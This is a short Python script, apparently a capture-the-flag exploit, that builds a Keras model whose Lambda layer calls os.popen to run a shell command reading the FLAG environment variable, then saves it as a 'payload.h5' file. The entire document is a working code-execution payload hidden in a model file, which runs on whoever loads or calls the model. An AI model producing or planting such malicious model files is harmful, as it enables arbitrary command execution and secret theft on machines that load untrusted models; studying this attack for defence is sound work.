from tensorflow import keras

model = keras.Sequential([
    keras.layers.Lambda(
        lambda _: __import__("os").popen('echo $FLAG').read()
    )
])

model_path = "payload.h5"
model.save(model_path)

print("> Payload saved to:", model_path)